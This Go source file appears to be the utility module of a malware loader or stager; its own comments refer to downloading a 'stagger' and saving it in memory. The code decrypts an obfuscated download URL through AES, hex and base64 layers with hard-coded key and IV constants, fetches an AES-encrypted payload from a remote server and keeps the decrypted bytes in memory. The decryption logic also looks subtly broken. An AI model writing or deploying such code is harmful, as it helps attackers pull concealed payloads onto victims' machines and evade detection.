package utils

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

// MemData Struct to hold Stagger in Memory
type MemData struct {
	Data []byte
	Name string
	Size int
}

// Constants
const (
	hkey = "4e6d39344e6b70775130772f616a497a6133464865513d3d"
	hiv  = "5a305a6f4f4574424d585a775a315134553155684e673d3d"
)

// HandleError Handles errors from external functions
func HandleError(msg string, err error) {
	if err != nil {
		log.Fatalf("%s: %v", msg, err)
	}
}

// DownloadFileFromServer downloads stagger and saves it in memory.
func (m *MemData) DownloadFileFromServer(ctx context.Context, DownloadURL string) error {
	DownloadURL = ReturnValidate(DownloadURL)
	req, err := http.NewRequestWithContext(ctx, "GET", DownloadURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Proto = "HTTP/1.1"
	client := &http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error making request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	// DONE Decrypt Payload from AES
	var buf bytes.Buffer
	encryptedData, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read body: %w", err)
	}
	decryptedBody := AESDecode(HexEncode(encryptedData))
	decryptedBodyReader := bytes.NewReader(decryptedBody)
	_, err = io.Copy(&buf, decryptedBodyReader)
	if err != nil {
		return fmt.Errorf("failed to copy body: %w", err)
	}
	m.Data = buf.Bytes()
	m.Size = buf.Len()
	return nil
}

// HexDecode Convert From Hex
func HexDecode(data string) []byte {
	dec, err := hex.DecodeString(data)
	HandleError("Hex error occurred", err)
	return dec
}

// HexEncode Convert a string or byte to Hex
func HexEncode[K []byte | string](data K) string {
	return hex.EncodeToString([]byte(data))
}

// BaseDecode Base64 decode
func BaseDecode(data string) []byte {
	dec, err := base64.StdEncoding.DecodeString(data)
	HandleError("B64 error occurred", err)
	return dec
}

// BaseEncode Base64 encode
func BaseEncode(data []byte) string {
	enc := base64.StdEncoding.EncodeToString(data)
	return enc
}

// ReturnValid Returns a Hex, Base Decoded byte
func ReturnValid(data string) []byte {
	if strings.Contains(data, "\x00") {
		data = strings.ReplaceAll(data, "\x00", "")
	}
	d := HexDecode(data)
	b := BaseDecode(string(d))
	return b
}

// ReturnValidate Returns decode AES a string
func ReturnValidate(data string) string {
	newData := AESDecode(data)
	unpackedData := string(newData)
	newData = ReturnValid(unpackedData)
	return string(newData)
}

// AESDecode AES Decoding Mechanism
func AESDecode(data string) []byte {
	key := ReturnValid(hkey)
	iv := ReturnValid(hiv)
	encrypted := HexDecode(data)
	blockDec, err := aes.NewCipher(key)
	HandleError("Failed to initiate cipher", err)
	decrypt := cipher.NewCBCDecrypter(blockDec, iv)
	decipherText := make([]byte, aes.BlockSize+len(data))
	decrypt.CryptBlocks(decipherText, encrypted[aes.BlockSize:])
	return decipherText
}
